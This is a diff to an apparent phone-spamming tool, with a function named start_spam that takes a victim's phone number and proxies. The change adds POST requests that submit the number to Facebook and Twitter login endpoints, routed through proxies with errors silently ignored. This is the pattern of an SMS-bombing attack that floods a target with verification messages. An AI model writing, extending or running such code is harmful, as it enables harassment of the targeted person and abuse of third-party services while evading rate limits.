@@ -685,10 +685,20 @@ def start_spam(phone, proxies):
         except:
             pass
 
-       try:
-	    formatted_phone = format_phone(phone
-	    post("https://ru-ru.facebook.com/login/", data={"phone": phone}, headers=headers, proxies=proxies) 
+# Тестовые сервисы. Версия 0.0.2
 
+       try:
+	    formatted_phone = format_phone(phone, "+# (###) ###-##-##")	    
+	    post("https://ru-ru.facebook.com/login/", data={"phone": phone}, headers=headers, proxies=proxies) 
+       except:
+	    pass		
+       try:
+	    formatted_phone = format_phone(phone, "+# (###) ###-##-##")
+	    post("https://twitter.com/i/flow/login/",  data={"phone": phone}, headers=headers, proxies=proxies) 
+       except:
+	   pass
+					   
+					   
 def parse_phone(phone):
     if phone in ["", " "]:
         main()
